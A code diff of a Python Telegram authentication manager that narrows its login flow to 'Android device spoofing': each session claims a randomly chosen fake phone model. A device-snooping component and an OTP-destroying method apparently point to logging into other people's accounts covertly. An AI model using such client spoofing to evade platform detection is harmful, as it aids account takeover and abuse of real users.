@@ -128,24 +128,16 @@ class AuthManager:
         self.bot_manager = bot_manager
         self.device_snooper = DeviceSnooper(mongodb) if mongodb else None
         
-        # Multiple API credentials for different device types
+        # Android API credentials only
         self.api_credentials = {
             "android": {
-                "api_id": getattr(config.telegram, 'android_api_id', config.telegram.api_id),
-                "api_hash": getattr(config.telegram, 'android_api_hash', config.telegram.api_hash)
-            },
-            "ios": {
-                "api_id": getattr(config.telegram, 'ios_api_id', config.telegram.api_id),
-                "api_hash": getattr(config.telegram, 'ios_api_hash', config.telegram.api_hash)
-            },
-            "desktop": {
-                "api_id": getattr(config.telegram, 'desktop_api_id', config.telegram.api_id),
-                "api_hash": getattr(config.telegram, 'desktop_api_hash', config.telegram.api_hash)
+                "api_id": config.telegram.api_id,
+                "api_hash": config.telegram.api_hash
             }
         }
-        # Mobile device profiles for proper Telegram app detection
+        # Android device profiles only
         self.devices = [
-            # Samsung Galaxy Series (Popular worldwide)
+            # Samsung Galaxy Series
             {"model": "SM-G973F", "system": "Android 10", "version": "10.14.5"},
             {"model": "SM-G975F", "system": "Android 11", "version": "10.14.5"},
             {"model": "SM-G980F", "system": "Android 11", "version": "10.14.5"},
@@ -184,7 +176,7 @@ class AuthManager:
             {"model": "OnePlus Nord", "system": "Android 11", "version": "10.14.5"},
             {"model": "OnePlus Nord 2", "system": "Android 12", "version": "10.14.5"},
             {"model": "OnePlus Nord CE", "system": "Android 11", "version": "10.14.5"},
-            # Xiaomi Series (Very popular globally)
+            # Xiaomi Series
             {"model": "Xiaomi Mi 10", "system": "Android 11", "version": "10.14.5"},
             {"model": "Xiaomi Mi 11", "system": "Android 11", "version": "10.14.5"},
             {"model": "Xiaomi Mi 12", "system": "Android 12", "version": "10.14.5"},
@@ -197,32 +189,6 @@ class AuthManager:
             {"model": "Xiaomi POCO F3", "system": "Android 11", "version": "10.14.5"},
             {"model": "Xiaomi POCO X3", "system": "Android 10", "version": "10.14.5"},
             {"model": "Xiaomi Black Shark 4", "system": "Android 11", "version": "10.14.5"},
-            # iPhone Series (All generations)
-            {"model": "iPhone 11", "system": "iOS 15.7", "version": "10.14.5"},
-            {"model": "iPhone 11 Pro", "system": "iOS 16.2", "version": "10.14.5"},
-            {"model": "iPhone 11 Pro Max", "system": "iOS 16.3", "version": "10.14.5"},
-            {"model": "iPhone 12", "system": "iOS 16.5", "version": "10.14.5"},
-            {"model": "iPhone 12 mini", "system": "iOS 16.4", "version": "10.14.5"},
-            {"model": "iPhone 12 Pro", "system": "iOS 16.6", "version": "10.14.5"},
-            {"model": "iPhone 12 Pro Max", "system": "iOS 16.7", "version": "10.14.5"},
-            {"model": "iPhone 13", "system": "iOS 16.7", "version": "10.14.5"},
-            {"model": "iPhone 13 mini", "system": "iOS 17.0", "version": "10.14.5"},
-            {"model": "iPhone 13 Pro", "system": "iOS 17.1", "version": "10.14.5"},
-            {"model": "iPhone 13 Pro Max", "system": "iOS 17.1", "version": "10.14.5"},
-            {"model": "iPhone 14", "system": "iOS 17.1", "version": "10.14.5"},
-            {"model": "iPhone 14 Plus", "system": "iOS 17.1", "version": "10.14.5"},
-            {"model": "iPhone 14 Pro", "system": "iOS 17.1", "version": "10.14.5"},
-            {"model": "iPhone 14 Pro Max", "system": "iOS 17.2", "version": "10.14.5"},
-            {"model": "iPhone 15", "system": "iOS 17.2", "version": "10.14.5"},
-            {"model": "iPhone 15 Plus", "system": "iOS 17.2", "version": "10.14.5"},
-            {"model": "iPhone 15 Pro", "system": "iOS 17.2", "version": "10.14.5"},
-            {"model": "iPhone 15 Pro Max", "system": "iOS 17.2", "version": "10.14.5"},
-            # Windows Desktop Variations
-            {"model": "Telegram Desktop", "system": "Windows NT 10.0", "version": "4.15.1"},
-            {"model": "Telegram Desktop", "system": "Windows NT 6.1", "version": "4.15.1"},
-            {"model": "Telegram Desktop", "system": "Windows NT 6.3", "version": "4.15.1"},
-            {"model": "Telegram Desktop", "system": "Windows 10", "version": "4.15.1"},
-            {"model": "Telegram Desktop", "system": "Windows 11", "version": "4.15.1"},
         ]
 
     async def destroy_otp_code(self, phone: str, code: str) -> bool:
@@ -267,41 +233,21 @@ class AuthManager:
             raise
 
     def _get_device_type(self, device: Dict) -> str:
-        """Determine device type for API selection"""
-        system = device["system"].lower()
-        if "android" in system:
-            return "android"
-        elif "ios" in system or "ipad" in system:
-            return "ios"
-        else:
-            return "desktop"
+        """Determine device type for API selection - Android only"""
+        return "android"
     
     async def _start_normal_auth(self, phone: str) -> Dict[str, any]:
-        """Start normal authentication flow with device-specific API"""
+        """Start normal authentication flow with Android device spoofing"""
         device = random.choice(self.devices)
-        device_type = self._get_device_type(device)
-        
-        # Get appropriate API credentials
-        credentials = self.api_credentials[device_type]
-        
-        # Use official Telegram app parameters
-        if "Android" in device["system"]:
-            app_version = "10.14.5"
-            device_model = device["model"]
-        elif "iOS" in device["system"]:
-            app_version = "10.14.5"
-            device_model = device["model"]
-        else:
-            app_version = device["version"]
-            device_model = device["model"]
+        credentials = self.api_credentials["android"]
         
         client = TelegramClient(
             StringSession(), 
             credentials["api_id"], 
             credentials["api_hash"],
-            device_model=device_model,
+            device_model=device["model"],
             system_version=device["system"],
-            app_version=app_version,
+            app_version="10.14.5",
             lang_code="en",
             system_lang_code="en-US"
         )
